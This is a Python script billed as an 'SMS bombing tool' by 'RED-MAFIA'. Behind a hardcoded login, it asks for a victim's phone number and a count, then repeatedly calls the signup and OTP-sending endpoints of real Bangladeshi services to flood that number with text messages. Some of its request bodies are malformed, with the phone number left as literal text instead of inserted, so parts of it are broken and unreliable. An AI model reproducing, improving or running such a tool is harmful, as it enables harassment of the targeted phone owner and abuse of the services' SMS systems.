import requests
from requests.structures import CaseInsensitiveDict
import sys
import time
blue= '\33[94m'
lightblue= '\33[94m'
red= '\33[91m'
white= '\33[97m'
yellow= '\33[93m'
green= '\33[1;32m'
cyan= '\33[0m'

logo=green+str("""

\33[93m██████╗░██████╗░██╗░░░██╗░░███╗░░██╗░░░░░
██╔══██╗╚════██╗██║░░░██║░████║░░██║░░░░░"\33[91m
██║░░██║░█████╔╝╚██╗░██╔╝██╔██║░░██║░░░░░
"\33[1;32m██║░░██║░╚═══██╗░╚████╔╝░╚═╝██║░░██║░░░░░
██████╔╝██████╔╝░░╚██╔╝░░███████╗███████╗
╚═════╝░╚═════╝░░░░╚═╝░░░╚══════╝╚══════╝"\33[97m

\33[97m Hey Buddy,THIS IS RK RED-MAFIA.
\33[1;32mSMS BOMBING TOOLS
\33[91m──────────────────────────────────────────────────
\33[93m▸ AUTHOR     : RED-MAFIA
\33[1;32m▸ FACEBOOK   : https://www.facebook.com/ᎡᎬᎠ-ᎷᎪҒᏆᎪ-102896575436747/
\33[91m▸ GITHUB     : GITHUB.COM/RED-MAFIA
\33[91m──────────────────────────────────────────────────

""")

print(logo)

usern="RK"
passwd="RK"



inpuser=str(input("•\33[93mEnter Username:-\33[91m"))
inppass=str(input("•\33[91mEnter Password:-\33[93m"))

if usern==inpuser and passwd==inppass:
	print("\33[1;32m[√] Login Successful RK")
	pass
	
else:
		print("\33[91m[×] Wrong Username or Password")
		sys.exit()

print("\33[1;32m──────────────────────────────────────────────────")
number=str(input("\33[93mEnter Your Number : "))
amount=int(input("\33[91mEnter Your Amount : "))
print("\33[1;32m──────────────────────────────────────────────────")
#post

url1 = "https://api.redx.com.bd/v1/user/signup"

headers1 = CaseInsensitiveDict()
headers1["Content-Type"] = "application/json"

data1 = """
{
  "name": "01955483106",
  "phoneNumber": "+88"+number,
  "service": "redx"
}
"""
url2 = "https://stage.bioscopelive.com/en/login/send-otp?phone=88"+number+"&operator=bd-otp"

headers2 = CaseInsensitiveDict()
headers2["Content-Type"] = "application/x-www-form-urlencoded"

data2 = "%7B=&%22name%22%3A%20%2201955483106%22%2C=&%22phoneNumber%22%3A%20%2201955483106%22%2C=&%22service%22%3A%20%22r="

url3 = "https://api.redx.com.bd/v1/user/signup"

headers3 = CaseInsensitiveDict()
headers3["Content-Type"] = "application/json"

data3 = """
{
  "name": "01955483106",
  "phoneNumber": "+88"+number,
  "service": "redx"
}
"""

url4 = "https://api.redx.com.bd/v1/user/signup"

headers4 = CaseInsensitiveDict()
headers1["Content-Type"] = "application/json"

data4 = """
{
  "name": "01955483106",
  "phoneNumber": "+88"+number,
  "service": "redx"
}
"""

for i in range(amount):
	resp2 = requests.post(url2, headers=headers2, data=data2)
	resp1 = requests.post(url1, headers=headers1, data=data1)
	resp3 = requests.post(url3, headers=headers3, data=data3)
	resp4 = requests.post(url4, headers=headers4, data=data4)
	print(str(i+1)+"\33[1;32m[✓]SMS SENT SUCCESSFUL ")





